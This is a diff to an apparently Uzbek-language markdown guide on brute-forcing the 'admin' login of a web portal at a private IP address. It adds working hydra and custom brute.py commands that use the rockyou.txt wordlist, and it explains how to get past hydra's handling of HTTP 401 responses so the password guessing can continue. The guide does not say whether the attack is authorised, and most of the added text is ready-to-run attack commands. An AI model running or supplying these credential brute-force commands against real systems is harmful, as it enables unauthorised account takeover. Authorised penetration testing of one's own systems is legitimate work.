@@ -45,6 +45,39 @@ hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -f -t 8 \
 
 ---
 
+## ⚠️ MUHIM: hydra `received HTTP error code 401` xatosi
+
+Agar hydra shunday qatorlar bilan to'lib ketsa:
+```
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.
+        Use module "http-get" instead, or set "1=".
+```
+Bu **xato emas** — bu portal **noto'g'ri parolda HTTP 401** qaytarayotganini bildiradi
+(brauzer baribir HTML'ni ko'rsatadi: "Login failed / Invalid username or password").
+Hydra esa `4xx` javobni "xato" deb hisoblab, ishlashdan bosh tortadi.
+
+**Yechim** — hydra muallifi aytgan hidden `1=` parametri. Uni `F=` dan **oldin** qo'shing:
+
+```bash
+hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -t 16 -f \
+      10.15.1.54 \
+      http-post-form "/login:username=^USER^&password=^PASS^:1=:F=Invalid"
+```
+
+Ya'ni condition: **`1=:F=Invalid`** — `1=` (bo'sh) "401 ni normal javob deb qabul qil",
+`F=Invalid` esa "xato javobda 'Invalid' bo'ladi" degani.
+
+### Agar `1=` ishlamasa (ba'zi hydra versiyalarida)
+`brute.py` `401` ni **o'zi to'g'ri boshqaradi** (HTTPError'ni ham o'qib, `--fail` ni qo'llaydi):
+```bash
+python3 brute.py --url http://10.15.1.54:9004/login \
+                 --login-page http://10.15.1.54:9004/ \
+                 --username admin --wordlist /usr/share/wordlists/rockyou.txt \
+                 --fail "Invalid username or password" --threads 32
+```
+
+---
+
 ## ⏱️ Qancha vaqt ketadi? (hydra tezligi)
 
 `rockyou.txt` ichida **14,344,399** parol bor. Ya'ni vaqt = **parolning ro'yxatdagi
